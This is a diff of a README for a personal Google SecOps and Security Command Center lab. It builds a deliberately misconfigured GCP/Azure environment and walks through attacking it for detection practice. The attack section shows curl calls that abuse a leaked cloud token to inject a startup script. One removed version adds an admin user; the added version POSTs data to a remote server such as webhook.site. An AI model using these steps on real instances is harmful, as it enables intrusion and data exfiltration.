@@ -1,57 +1,76 @@
 # Google Security Operations and Security Command Center Laboratory
 
-This file documents my own lab set up to learn Google SecOps (formerly Chronicle) and GCP Security Command Center (SCC).
+This document outlines the setup and configuration of a personal cybersecurity lab focused on Google Security Operations (formerly Chronicle) and Google Cloud Security Command Center (SCC). The purpose of this lab is to explore real-world security monitoring, threat detection, and incident response using Google Cloud’s native security stack.
+
+---
 
 ## Prerequisites
 
-- Create a GCP account with a [Free Trial](https://cloud.google.com/free?hl=en) that includes **300 credits for 3 months** (If you are unsure about how the Free Trial credits work, visit this [page](https://cloud.google.com/free/docs/free-cloud-features#free-trial)).
+### 1. Google Cloud Free Trial
+
+
+Begin by creating a Google Cloud Platform (GCP) account with a [Free Trial](https://cloud.google.com/free?hl=en), which includes **$300 in credits valid for 90 days**.
 
 ```diff
-- [!] IMPORTANT: Do not confuse the Free Trial with the Free-tier
+- ⚠️ Do not confuse the Free Trial with the Always Free Tier. The Free Trial provides temporary credits for broader usage, including GCP premium services.
 ```
 
-- Create a GCP project
-    - You can give it the name `scc-secops-lab`.
+### 2. Create a GCP Project
+
+Create a new project in your GCP account. For consistency throughout the lab, name it: `scc-secops-lab`
 
 ![GCP create new project](/src/images/scc-secops-lab/01-gcp-create_new_project.png)
 
-- If you requested the Free Trial, you should see the following in the GCP project's homepage.
+Once the project is created, your GCP homepage should look like this:
 
 ![New project homepage](/src/images/scc-secops-lab/02-gcp-new_project_homepage.png)
 
-- To minimize the risk of being charged, set up your billing account settings.
-    1. Click the `Set up budget alerts` option and click the `Create budged` button.
-    2. You can name your budget alert `Cyber-Lab-Budget`
-    3. Set an starting budget amount to give you a comfortable buffer. I selected `$150` as my initial budget.
-    4. Set up threshold alerts. I created three thresholds at `50%`, `75%`, and `90$`, all of them to trigger when the spend reaches that threshold.
-    5. Save the budget alert.
+### 3. Set Up Billing Alerts
+
+To prevent unintentional charges and monitor your usage, configure a billing budget:
+
+1. In the **Billing** section, click `Set up budget alerts`, then select `Create budget`.
+2. Name your budget (e.g., `Cyber-Lab-Budget`).
+3. Set an initial budget amount. I recommend **$150** for a safety buffer.
+4. Configure thresholds to receive alerts at **50%**, **75%**, and **90%** of your budget.
+5. Save your settings.
 
 ![GCP project budget alert](/src/images/scc-secops-lab/03-gcp-project_budget_alert.png)
 
 ```diff
-+ [!] RECOMMENDATION: It is a best practice to always keep track of your cloud resources consumption and billing. In any case, we will allow billing for the account later to enable the creation of Windows Server VMs, and this alert will keep us safe that we are not overconsuming our remaining credits.
++ ✅ Monitoring billing is a cloud best practice. Since we’ll enable billing later to deploy certain resources (like Windows Server VMs), these alerts help ensure we remain within the Free Trial limits.
 ```
 
-With these settings done, you can start working in the lab.
+Once this is done, you're ready to begin the lab.
 
-## Enabling Security Command Center
+---
 
-1. In the GCP Console search bar, type `Security Command Center` and select it, or open the sidebar and go to `Security > (Security Command Center) Risk Overview`.
-2. Enable SCC by following the next steps:
-    1. In the "Security Command Center - Get started today" webpage, click the `Get Security Command Center` button ([picture](/src/images/scc-secops-lab/04-gcp-get_scc_webpage.png)).
-    2. In the "Select a tier" tab, choose the Premium tier ([picture](/src/images/scc-secops-lab/05-gcp-select_scc_tier.png)).
-    4. In the "Select services" tab, keep the default settings and click `Next`.
-    5. In the "Grant roles" tab, chose the option `Grant roles automatically` and click `Grant roles`. Then click the `Next` button.
-    6. In the "Complete setup" tab, click the `Finish` button. It may take a few minutes to save.
+## Enabling Security Command Center (SCC)
 
-![SCC Risk Overview Page](/src/images/scc-secops-lab/06-scc-risk_overview_page.png)
+1. In the GCP Console, open the navigation menu or use the search bar to find **Security Command Center**.
+   - Navigate to: `Security > Security Command Center > Risk Overview`
 
-With this set up, you should have [Project-level](https://cloud.google.com/security-command-center/docs/activate-scc-overview) activated Security Command Center service.
+2. Follow these steps to activate SCC:
+   1. Click **Get Security Command Center**  
+      ![SCC Get Started](/src/images/scc-secops-lab/04-gcp-get_scc_webpage.png)
+   
+   2. In the **Select a tier** step, choose the **Premium** option  
+      ![SCC Select Tier](/src/images/scc-secops-lab/05-gcp-select_scc_tier.png)
+   
+   3. Leave the default services enabled, then click `Next`.
+   
+   4. Under **Grant roles**, select `Grant roles automatically`, then click `Grant roles` and proceed.
+   
+   5. In the final **Complete setup** step, click `Finish`. The activation process may take a few minutes.
+
+Once complete, Security Command Center will be enabled at the **project level**. You can verify activation using [this guide](https://cloud.google.com/security-command-center/docs/activate-scc-overview).
+
+---
 
 ## Enabling Google SecOps
 
 ```diff
-- [!] IMPORTANT: To enable Google SecOps, your organization must contact a Google Cloud Security Partner.
+- ⚠️ To enable Google SecOps, your organization must contact a Google Cloud Security Partner.
 ```
 
 ## Setting up the Warm-up Lab
@@ -102,7 +121,7 @@ th1s_15_4n0th3r_p455w0rd
 With this set up done, you have a vulnerable cloud storage instance that adversaries can read from the internet.
 
 ```diff
-+ [!] RECOMMENDATION: Take a look at SCC Risk Overview page. Do you notice something different?
++ ✅ Take a look at SCC Risk Overview page. Do you notice something different?
 ```
 
 ### Create a Overly Permissive Firewall Rule
@@ -149,7 +168,7 @@ You can refer to [`gcloud compute firewall-rules` Reference](https://cloud.googl
 You can also run this [gcloud shell script](/src/gcloud_scripts/scc-secops-lab/01-gcp-cengine-e2small_vm.gcloud.bash) to automatically create and deploy the VM.
 
 ```diff
-- [!] IMPORTANT: Remember to STOP your VM every time you STOP working with your lab, like when going to sleep. This will reduce your GCP billing!
+- ⚠️ Remember to STOP your VM every time you STOP working with your lab, like when going to sleep. This will reduce your GCP billing!
 ```
 
 ## LAB: Identify Vulnerabilities in your Google Cloud Environment with SCC
@@ -192,7 +211,7 @@ Below the "Get accurate attack exposure scores" you have the actual SCC informat
 | Data security finding | Data | Top severity findings found in your data. |
 
 ```diff
-- [!] IMPORTANT: Notice that the UI may change in the future. The cards listed above correspond to the cards found at the time of writing this file (July, 2025)
+- ⚠️ Notice that the UI may change in the future. The cards listed above correspond to the cards found at the time of writing this file (July, 2025)
 ```
 
 You will notice that we already have some vulnerabilities listed in some cards. Besides, yf you leaved your VM turn on a few hours, it is possible that some adversaries have already attacked your vulnerable machine. In that case, you would have also some detected threats (altough most of the detected threats are about consequenses of IAM misconfigurations, e.g. unauthorized access from unexpected location; or execution of malware).
@@ -206,7 +225,7 @@ Look at the `Active vulnerabilities` card in the `Risk Overview` page of SCC. Se
 - 3 high severity findings in the `Firewall` category
 
 ```diff
-- [!] IMPORTANT: If you changed the configuration of your instances during the deployment of the services, you might have more or less vulnerabilities.
+- ⚠️ If you changed the configuration of your instances during the deployment of the services, you might have more or less vulnerabilities.
 ```
 
 Click the unique high severity finding that is in the `buckets` category. **When you click any finding in the `Risk Overview Page`, you are redirected to the `Findings` tab in SCC**.
@@ -279,22 +298,19 @@ You might be wondering what is are the differences (technical and operational) b
 
 In short, **SCC is best for securing your GCP cloud environment itself**, while **Google SecOps is best for enterprise-wide detection regardless of where the data comes from**.
 
-## Setting up the Real Lab
+---
 
+
+## Setting up the Real Lab
 
 ### Prerequisites
 
-**Google Cloud Prerequisites**
+**Google Prerequisites**
 
-- TODO
-
-**Azure Prerequisites**
-
-- TODO
-
-**On-premise Prerequisites**
-
-- TODO
+- Google Cloud Platform account with credits
+- Azure account with credits
+- SCC Premium enabled at project level
+- Google SecOps instance
 
 ### Setting Up Part 1: Cloud Infrastructure
 
@@ -303,7 +319,7 @@ Follow the instructions carefully to set up the lab environment.
 I will use **bold text** to highlight headings, titles, and sections in GCP and Azure. Every important value or settings that you need to set manually will be presented in a `code block`.
 
 ```diff
-+ [!] RECOMMENDATION: Try to follow the instructions as close as you can. The environment is quite extensive and complex.
++ ✅ Try to follow the instructions as close as you can. The environment is quite extensive and complex.
 ```
 
 **Create the environments in GCP and Azure**
@@ -342,15 +358,15 @@ In this section, we will be enabling a [VPN connection between Azure and GCP](ht
     - AZURE_VNETGW_PUBIP_2_IP="20.246.198.218"
 
 ```diff
-- [!] IMPORTANT: This Azure resource takes some time to deploy.
+- ⚠️ This Azure resource takes some time to deploy.
 ```
 
 ```diff
-- [!] IMPORTANT: In Azure, the VPN Gateway will drain your free credits very quickly (Around $5 to $10 USD per day). You can skip the creation of the VPN Gateway until it is absolutely necessary.
+- ⚠️ In Azure, the VPN Gateway will drain your free credits very quickly (Around $5 to $10 USD per day). You can skip the creation of the VPN Gateway until it is absolutely necessary.
 ```
 
 ```diff
-+ [!] RECOMMENDATION: Alternatively, you can rely on software-based VPN like ZeroTier and skip this set up.
++ ✅ Alternatively, you can rely on software-based VPN like ZeroTier and skip this set up.
 ```
 
 3. In **GCP**, go to **Network Connectivity > VPN** and click **Create VPN connection**
@@ -382,7 +398,7 @@ The VPN connection between Azure and GCP should be stablished. You can quickly v
 2. In **GCP**, go to **Network Connectivity > VPN** and validate the status of your tunnel `$GCP_VPN_TUNNEL_NAME` has the value `Established`.
 
 ```diff
-- [!] IMPORTANT: If your VPN connection is failing, create a firewall rule in the VPC that allows inbound traffic from the address spaces of your Azure VNET.
+- ⚠️ If your VPN connection is failing, create a firewall rule in the VPC that allows inbound traffic from the address spaces of your Azure VNET.
 ```
 
 If you had issues setting up this part of the lab infrastructure, refer to the following documentation:
@@ -441,7 +457,7 @@ In GCP, go to your Windows Server VM and click the button **Set Windows password
     - AZURE_VM_WS_NETWORKING_DELETE_NIC_AND_IP="true"
 
 ```diff
-- [!] IMPORTANT: The WS VM will not have a public IP address assigned. Your Azure Free Trial license only allows you to have 3 public IP addresses, which are already used by your VNET Gateway and your DC. For security reasons, you might want to give the public IP adddress of the DC to the WS.
+- ⚠️ The WS VM will not have a public IP address assigned. Your Azure Free Trial license only allows you to have 3 public IP addresses, which are already used by your VNET Gateway and your DC. For security reasons, you might want to give the public IP adddress of the DC to the WS.
 ```
 
 4. Test connectivity between your virtual machines.
@@ -449,11 +465,11 @@ In GCP, go to your Windows Server VM and click the button **Set Windows password
 You can connect to your virtual machines using the public ip addresses of each VM in each cloud service provider. Use the **ping** command from your VM in **Azure** to the VM in **GCP**. You can also try use **Windows Remote Desktop** and access the VM in **GCP** from your VM in **AZURE**.
 
 ```diff
-- [!] IMPORTANT: You will not be able to connect to your VM if you did not create a  firewall rule that allows inbound traffic from your location. 
+- ⚠️ You will not be able to connect to your VM if you did not create a  firewall rule that allows inbound traffic from your location. 
 ```
 
 ```diff
-+ [!] RECOMMENDATION: However, you can avoid creating such over-permissive rule by nesting RDP sessions from your other VMs, as long as they are reachable through the VPN tunnel.
++ ✅ However, you can avoid creating such over-permissive rule by nesting RDP sessions from your other VMs, as long as they are reachable through the VPN tunnel.
 ``` 
 
 **Deploy a Vulnerable Application in Cloud Run and Insecure Database in GCP**
@@ -461,7 +477,7 @@ You can connect to your virtual machines using the public ip addresses of each V
 1. Create a database in **GCP**
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 2. Deploy the vulnerable web application to **GCP**. You can find the `Dockerfile` and source code in the `/src/vuln_app/`.
@@ -484,7 +500,7 @@ gcloud artifacts locations list
 ```
 
 ```diff
-- [!] IMPORTANT: If you get the message "WARNING: `docker-credential-gcloud` not in system PATH." when authenticating docker, the later commands might not work. You may be able to solve the issue with the following commands:
+- ⚠️ If you get the message "WARNING: `docker-credential-gcloud` not in system PATH." when authenticating docker, the later commands might not work. You may be able to solve the issue with the following commands:
 ```
 
 ```bash
@@ -568,7 +584,7 @@ docker push $REPOSITORY_LOCATION-docker.pkg.dev/$GCP_PROJECT_ID/$GCP_REPOSITORY_
 ```
 
 ```diff
-- [!] IMPORTANT: If the push operation fails, verify that you your Artifact Registry format is Docker and that you are authenticated with `gcloud auth login`.
+- ⚠️ If the push operation fails, verify that you your Artifact Registry format is Docker and that you are authenticated with `gcloud auth login`.
 ```
 
 ![Vulnerable Application in Artifact Registry](/src/images/scc-secops-lab/29-gcp_artreg-vulnerable_application_in_artregpng.png)
@@ -638,7 +654,7 @@ Open the **Server Manager** application and then open **Active Directory Users a
 ![Clean ADUC Users built-in OU](/src/images/scc-secops-lab/33-dc-aduc_move_group_users_to_ou.png)
 
 ```diff
-- [!] IMPORTANT: If you mistakenly created an OU with the incorrect name and you need to delete it, activate **Advanced Features** under the **View** tab. Then, right-click the OU you want to delete and uncheck the box **Protect object from accidental deletion** in the **Object** tab. Then, you will be able to delete the OU.
+- ⚠️ If you mistakenly created an OU with the incorrect name and you need to delete it, activate **Advanced Features** under the **View** tab. Then, right-click the OU you want to delete and uncheck the box **Protect object from accidental deletion** in the **Object** tab. Then, you will be able to delete the OU.
 ```
 
 Now, we need to create a few user accounts. The first two users you create must be normal users, i.e., right-click in the Users built-in OU and click **New > User**. The third user will be a service account for the SQL service, and you must deilberately create it by right-clicking the **Copy** menu option of the administrator account of the domain (In my case was `alejandro_rodriguez`).
@@ -669,7 +685,7 @@ Notice that the **SQL service** account has a secure password (You can generate 
 You might be thinking that this does not make sense at all (If you think that, then you are a good security specialist). However, you might be surprised to know that many AD administrators, especially those without strong security training, have been known to store service account passwords in the **Description**, **Notes**, or even **Display Name** fields of Active Directory user objects. Even if they do not store secrets, you may encounter [administrators storing other information in these fields](https://www.reddit.com/r/sysadmin/comments/12jp7iq/do_you_put_anything_in_the_description_field_of_ad/?utm_source=chatgpt.com), that you can use as a pentester to [collect valuable metadata](https://attack.mitre.org/techniques/T1005/) that can help you identify high-value systems or users.
 
 ```diff
-+ [!] RECOMMENDATION: This lab is not about remediation or system hardening, but you must learn from this example that even non-secret metadata is quite often sensitive. Avoid putting personally identifying information (PII) or role-sensitive metadata in publicly readable fields.
++ ✅ This lab is not about remediation or system hardening, but you must learn from this example that even non-secret metadata is quite often sensitive. Avoid putting personally identifying information (PII) or role-sensitive metadata in publicly readable fields.
 ```
 
 Now, we will create a [Service Principal Name(SPV)](https://learn.microsoft.com/en-us/archive/technet-wiki/717.service-principal-names-spn-setspn-syntax) for the SQL Service account.
@@ -688,7 +704,7 @@ setspn -a %SERVICECLASS%/%FQDN%:%PORT% %ACCOUNT%
 ````
 
 ```diff
-- [!] IMPORTANT: You might have noticed that in Kamran Bilgrami's post, the SPN syntax that he used isn't syntactically correct.
+- ⚠️ You might have noticed that in Kamran Bilgrami's post, the SPN syntax that he used isn't syntactically correct.
 ```
 
 For example, our **SQL Service** SPN can be assigned in this way:
@@ -724,7 +740,7 @@ In the **WS** computer,
 - In the **Etnernet IPv4 settings**, configure the IP address of the **DC** as the **DNS Address** for this machine.
 
 ```diff
-+ [!] RECOMMENDATION: If you have not do it yet, configure a static IPv4 address for the DC.
++ ✅ If you have not do it yet, configure a static IPv4 address for the DC.
 ```
 
 - Finally, join the computer to the domain. In the **Windows Search Bar**, look for `About your PC`. Then, In the **Related Settings** heading, click **Advanced System Settings**. Go to the **Computer Name** tab and click the **Change** button. Type the **NETBIOS** or **Domain Name** in the **Domain** field (You should have stored those values in the `VM_DC_DS_NETBIOS_NAME` and `VM_DC_DOMAIN_NAME` labels. For me, it was `AJRC` and `ajrc.local` respectively).
@@ -744,7 +760,7 @@ Finally add users to the **Local Administrators Group**.
 ![Add User Accounts to the Local Adminsitrators Group](/src/images/scc-secops-lab/36-ws-add_local_administrators.png)
 
 ```diff
-- [!] IMPORTANT: If you read Kamran Bilgrami's post, you may have noticed that he actually deployed 2 client computers. The second VM is the RODC that we already created in GCP.
+- ⚠️ If you read Kamran Bilgrami's post, you may have noticed that he actually deployed 2 client computers. The second VM is the RODC that we already created in GCP.
 ```
 
 Repeat the steps that we just did in the **RODC** that is hosted in **GCP**. I.e. you must have the following configurations done:
@@ -753,7 +769,11 @@ Repeat the steps that we just did in the **RODC** that is hosted in **GCP**. I.e
 - However, do not join the **RODC** to the domain, since this process is done quite different to do compared to a standard workstation computer.
 
 ```diff
-+ [!] RECOMMENDATION: Configure a static IPv4 address for the RODC computer as well.
++ ✅ Configure a static IPv4 address for the RODC computer as well.
+```
+
+```diff
++ ✅ Disable Remote Desktop Network Level Authentication to avoid lossing access to this VM if the VPN tunnel fails for any reason.
 ```
 
 For the RODC, chose either `VM_DC_UC_USER1_LOGON_NAME` and `VM_DC_UC_USER2_LOGON_NAME` and add it as a **Local Administrators Group**.
@@ -782,11 +802,11 @@ You might want to make a little change nonetheless. Remove the public IP address
 To do this, disassociate the public IP address resource object from the **DC** VM, and assign the public IP address resource object to the **WS** VM. You will need to add an **Inbound Security Rule** to the **Network Security Group** associated to your **WS** VM, that permits RDP (`TCP/3389`) traffic.
 
 ```diff
-- [!] IMPORTANT: For the record, leaving RDP open to the internet for a WS is still a very bad practice, but not as terrible as leaving a DC open to the wild.
+- ⚠️ For the record, leaving RDP open to the internet for a WS is still a very bad practice, but not as terrible as leaving a DC open to the wild.
 ```
 
 ```diff
-- [!] IMPORTANT: If you cannot connect to the VM via RDP, it is possible that the size of the VM is affecting the performance of the remote connection. Resize the VM from `B1s` to `B1ms`, which provides 2GB of RAM instead of 1GB. Keep in mind that this operation might take a while to complete.
+- ⚠️ If you cannot connect to the VM via RDP, it is possible that the size of the VM is affecting the performance of the remote connection. Resize the VM from `B1s` to `B1ms`, which provides 2GB of RAM instead of 1GB. Keep in mind that this operation might take a while to complete.
 ```
 
 **Cloud misconfiguration, Shadow IT and Poor IAM**
@@ -796,19 +816,19 @@ This is the last part of the initial set up of the lab environment. The misconfi
 First, we are going to set up **cloud Misconfigurations** in **GCP**.
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future. Besides, you should already have various misconfigurations if you followed the instructions.
+- ⚠️ This part of the lab will be added in the future. Besides, you should already have various misconfigurations if you followed the instructions.
 ```
 
 Second, we are going to do something called **Shadow IT**. This refers to the deployment of cloud resources outside central command and control that still have access to sensitive data.
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 Finally, we just need to consigure **poor IAM settings** that allow adversaries to exploit (even more) our environment.
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 ### Setting Up Part 2: SCC and Google SecOps
@@ -835,14 +855,16 @@ Security Command Center will start analyzing your environment and indexing all y
 Install Windows Sysmon in your all your Windows machines. I have already documented this process in [another repository](https://github.com/AzJRC/Security-Operations/tree/develop/sysmon#quick-installation) that you might want to check!
 
 ```diff
-+ [!] RECOMMENDATION: Also check the section "XML Configuration file" in my repository, where I mention the `sysmon-config` file by SwiftOnSecurity. This will help you tailor the configuration of your Sysmon Installation.
++ ✅ Also check the section "XML Configuration file" in my repository, where I mention the `sysmon-config` file by SwiftOnSecurity. This will help you tailor the configuration of your Sysmon Installation.
 ```
 
 ![Install Windows Sysmon in Workstation](/src/images/scc-secops-lab/41-ws-install_windows_sysmon.png)
 
-**Enable extended logging in our windows domain**
+**Setup extended logging in the windows domain**
 
-TODO
+```diff
+- ⚠️ This part of the lab will be added in the future.
+```
 
 https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations?tabs=winserver
 
@@ -850,7 +872,7 @@ https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-be
 **Ingest network telemetry data from on-premises to Google SecOps using Google SecOps Forwarder**
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 **Ingest telemetry data from endpoints to Google SecOps using BindPlane Agent**
@@ -864,7 +886,7 @@ Once you create your account, you should see a dashboard like mine, depicted bel
 ![BindPlane App Dashboard](/src/images/scc-secops-lab/42-bindplane-bindplane_dashboard.png)
 
 ```diff
-+ [!] RECOMMENDATION: You can configure dark-mode by clicking the gear located in the upper-right corner of the UI. Search the relevant setting.
++ ✅ You can configure dark-mode by clicking the gear located in the upper-right corner of the UI. Search the relevant setting.
 ```
 
 Follow the steps below to set up BindPlane for our purposes.
@@ -873,7 +895,7 @@ Follow the steps below to set up BindPlane for our purposes.
 - For the **Agent Type** select `BDOT 1.x (Stable)` (This might change in the future).
 
 ```diff
-+ [!] RECOMMENDATION: I encourage you to try the Agent Type 2.0 (BETA). It is more powerful and efficient than the stable version, but it may not work. 
++ ✅ I encourage you to try the Agent Type 2.0 (BETA). It is more powerful and efficient than the stable version, but it may not work. 
 ```
 
 - For the **Platform** select `Windows`
@@ -885,7 +907,7 @@ In the next page of the configuration you need to add a **source**. A source ref
 You need to add a second source for Windows Sysmon events. Windows Sysmon are also generated by the Windows Events API, but they are not saved in an standard provider. Click the button **Add Source** and search again for `Windows Events`. Uncheck all default log providers (`System Events`, `Application Events`, and `Security Events`) and open the **Advanced** options. Add `Microsoft-Windows-Sysmon/Operational` in the **Custom Channels** field. You can add a description for this source as well if you want (E.g. `Sysmon Events`).
 
 ```diff
-- [!] IMPORTANT: Did you notice the **Raw Logs** checkbox in the advanced configuration? you might need to enable that option for both sources later if parsing in Google SecOps fails. But leave it unchecked for now.
+- ⚠️ Did you notice the **Raw Logs** checkbox in the advanced configuration? you might need to enable that option for both sources later if parsing in Google SecOps fails. But leave it unchecked for now.
 ```
 
 Click **Next** and you are in the final step of this configuration. Click **Add Destination**. You might already know what this is, but it refers to the receiver of the logs. Search for `Google SecOps`. Follow the steps below to properly configure the destination:
@@ -914,11 +936,11 @@ In the agent installation, first select the same **Agent Type** and **Platform**
 Now, copy the command that appears on screen. You need to run this command in the **WS** computer in a **Privileged Command Prompt Shell**. Wait a few seconds and the agent will appear in the UI, as shown below.
 
 ```diff
-- [!] IMPORTANT: If you tried out the Agent Beta and it did not work, you need to uninstall that program first. Search `Add or remove programas` in Windows Search and uninstall **BindPlane Distro for OpenTelemetry Collector**.
+- ⚠️ If you tried out the Agent Beta and it did not work, you need to uninstall that program first. Search `Add or remove programas` in Windows Search and uninstall **BindPlane Distro for OpenTelemetry Collector**.
 ```
 
 ```diff
-+ [!] RECOMMENDATION: If you want to see the installation wizard of BindPlane, remove the parameter `/quiet` from the command.
++ ✅ If you want to see the installation wizard of BindPlane, remove the parameter `/quiet` from the command.
 ```
 
 ![BindPlane Agent Installed in WS](/src/images/scc-secops-lab/46-bindplane-install_bindplane_agent_from_bindplane_ui_for_ws.png)
@@ -988,7 +1010,7 @@ You should be able to see various graphs showing the ingestion of the last day.
 ![Google SecOps Data Ingestion and Health Dashboard](/src/images/scc-secops-lab/53-secops_dashboards-ingestion_and_health_dashboard.png)
 
 ```diff
-- [!] IMPORTANT: It is very likely that you have a lot of parsing errors, as I had, as shown in the picture below. You can try troubleshoot this in several ways. The list of possible actions to solve the issues are explained next.
+- ⚠️ It is very likely that you have a lot of parsing errors, as I had, as shown in the picture below. You can try troubleshoot this in several ways. The list of possible actions to solve the issues are explained next.
 ```
 
 ![Google SecOps Parsing Errors](/src/images/scc-secops-lab/54-secops_dashboards-ingestion_and_health_dashboard_ingestions_event_by_log_type.png)
@@ -1003,7 +1025,7 @@ You have a few options to try solve the issue.
 **Ingest telemetry data from Google Cloud to Google SecOps**
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 > AUTHOR'S NOTE: My current Google Cloud Platform account and Google SecOps instance are not in the same organization, and I do not have organizational-level access in my GCP account, which is required to set up this ingestion pipeline. I will be updating the documentation as soon as I have in my hands a suitable environment to work with.
@@ -1099,7 +1121,7 @@ This integration enables API-based access to Microsoft Sentinel data for inciden
 **Ingest Azure NSG events to Google SecOps SIEM using Feeds with a custom parser**
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 https://davidsantiago.fr/nsg-flow-logs-to-event-hubs-using-logstash-and-container-apps/
@@ -1139,19 +1161,19 @@ Finally, go back to Google SecOps and move to **Response > Integration Setup**. 
 Once you have all the configuration, click **Save**. Wait a few seconds and then click the **Test remotely** button. You should see a green check, meaning that everything worked as expected.
 
 ```diff
-- [!] IMPORTANT: If you get an error message that says that you are missing the ping action from Siemplify (or something similar), go to the Marketplace and validate that you have the installed the Siemplify integration.
+- ⚠️ If you get an error message that says that you are missing the ping action from Siemplify (or something similar), go to the Marketplace and validate that you have the installed the Siemplify integration.
 ```
 
 **Develop Custom automated workflows with Google SecOps SOAR**
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 **Create a custom dashboard**
 
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ This part of the lab will be added in the future.
 ```
 
 **Develop Custom YARA-L Detection Rules**
@@ -1166,9 +1188,23 @@ Based on your lab, focus on detecting:
 
 **Finetune Google SecOps Configurations**
 
+This part of the lab is more theoretical than practical. In this part of the lab you will learn how to manage and configure your Google SecOps.
+
+First of all, it is very important to know that there are two main settings in Google SecOps, and neither of them affect the others: SIEM Settings and SOAR settings. This is particular true with the **Access Control** settings. You will notice that the platform allows you grant **Administrator** access both to the SIEM, but also for the SOAR. These are distinct administrator roles.
+
+This section will emphasize more on the SOAR settings, since SIEM settings were already touched several times in earlier sections and are also very well documented (I'll update the documentation to include SIEM settings in-depth in the future). Particularly the environment specific settings.
+
+Go to **Settings > SOAR Settings** and inspect the grouped settings that appear in the left sidebar. On of the most important settigns is **Organization > Environments**. Here, we can define our different contexts. I created an environment named `secops-scc-lab`. This setting is just visual, but helps keep every alert organized and clean.
+
 ```diff
-- [!] IMPORTANT: This part of the lab will be added in the future.
+- ⚠️ If you decided to create an envrionment as well, you will need to update your SOAR integrations.
 ```
+
+Under **Case Data** you can set up various parameters that can help you tailor the views of the Google SecOps cases. For instance, you can add a **Tag** that includes the word `Windows` in every case that contains a Windows computer involved.
+
+Under **Environments** you can tailor the details of each of the environments you created under **Organization > Environments**. For example, in this laboratory, we have two networks involved: `172.16.1.0/24` is the VNET in Azure, and `172.16.0.0/24` is the VPC in GCP. This is important information that we can add in the **Networks** settings.
+
+Explore the remaining settings just to have a clear understanding of what you can move.
 
 ## Happy Hacking!
 
@@ -1210,13 +1246,13 @@ Suppose that you want to discover vulnerable applications running in Google Clou
 You might want to try find your own application using **Google Dorking** techniques and IP scanners.
 
 ```diff
-- [!] IMPORTANT: Keep in mind that your application can be quite difficult to locate in the wild since it was created very recently.
+- ⚠️ Keep in mind that your application can be quite difficult to locate in the wild since it was created very recently.
 ```
 
 **Initial Access: Exploiting a vulnerability in a web application**
 
 ```diff
-+ [!] RECOMMENDATION: You may not know what vulnerability has the web application. If that's your case (either because somededy else built the lab for you, or because you didn't read the source code of the app), don't read this section and try to exploit the web app yourself!
++ ✅ You may not know what vulnerability has the web application. If that's your case (either because somededy else built the lab for you, or because you didn't read the source code of the app), don't read this section and try to exploit the web app yourself!
 ```
 
 How would you discover a web vulnerability. The vulnerable application included in this lab is quite easy to exploit, since it is just a bunch of HTML and Python code, which might recall you of a very common framework used by developers (**Flask**). You as the adversary might not know that, but you can assume it.
@@ -1300,7 +1336,7 @@ export ZONE="us-east1-d"
 curl -H "Authorization: Bearer $BEARER_TOKEN" \
      "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones/$ZONE/instances/$INSTANCE_NAME"
 
-export FINGERPRINT="alsSqal8dOY="
+export FINGERPRINT="Pol5p_ogKXQ="
 ```
 
 Notice that you want to extract the `metadata.fingerprint` value. GCP requires the exact current fingerprint when setting metadata to ensure you're updating the correct version. If you use the wrong one, you'll get a `412 Precondition Failed` error.
@@ -1333,35 +1369,65 @@ Below is a simplified sample output of this command.
 }
 ```
 
-
 ```diff
-+ [!] RECOMMENDATION: You can try manage and move other configurations like firewall/network tags (tags.fingerprint) and instance labels (labelFingerprint). Can you find other ways to gain access or perform your goal?
++ ✅ You can try manage and move other configurations like firewall/network tags (tags.fingerprint) and instance labels (labelFingerprint). Can you find other ways to gain access or perform your goal?
 ```
 
 **Persistance: Get remote access by Injecting metadata Using Leaked Cloud Token**
 
-You can try insert a [start up script](https://cloud.google.com/compute/docs/metadata/overview#startup_and_shutdown_scripts) in the VM to create a new user. 
+You can try insert a [start up script](https://cloud.google.com/compute/docs/metadata/overview#startup_and_shutdown_scripts) in the VM and perform some kind of operation.
+
+Since this is a Read-only DC (We only know that because of the VM hostname), we know in advance that write operations are forbidden. Thus, our goal is to exfiltrate enough information to get access via a valid account.
 
 ```bash
+# Change $REMOTE_HTTP_SERVER and $COMMAND manually.
+
 curl -X POST -H "Authorization: Bearer $BEARER_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
        "fingerprint": "$FINGERPRINT",
        "items": [
          {
-           "key": "windows-startup-script-cmd",
-           "value": "net user attacker P@ssw0rd123 /add && net localgroup administrators attacker /add"
+           "key": "windows-startup-script-ps1",
+           "value": "Invoke-WebRequest -Uri "$REMOTE_HTTP_SERVER" -Method POST -Body $COMMAND"
          }
        ]
      }' \
-     "https://compute.googleapis.com/compute/v1/projects/742540562663/zones/us-east1-d/instances/rodc-ajrc-local/setMetadata"
+     "https://compute.googleapis.com/compute/v1/projects/742540562663/zones/$ZONE/instances/$INSTANCE/setMetadata"
 ```
 
-The previous attack will cause the VM to create an admin user account named `attacker` on next reboot. Connect to the VM and restart the system yourself. See if you can loggin with the new account.
+One method to exfiltrate data easily is to try the `net user` command. But how can you receive the information? As explained in [this reddit post](https://www.reddit.com/r/hacking/comments/1e1nrgv/how_do_hackers_go_about_transferring_huge_amounts/):
 
-You can read more about this GCP Compute Engine feature in [Use startup scripts on Windows VMs](https://cloud.google.com/compute/docs/instances/startup-scripts/windows).
+> "Security teams focus a LOT of time securing inbound attacks, but often have blanket rules allowing outbound traffic [...]."
+
+Which is true in our environment. We only need a server in the wild listening for requests. We can use [Webhook.site](https://webhook.site), which is a tool used by developers. However, adversaries can use it as a remtoe repository for data exfiltration.
+
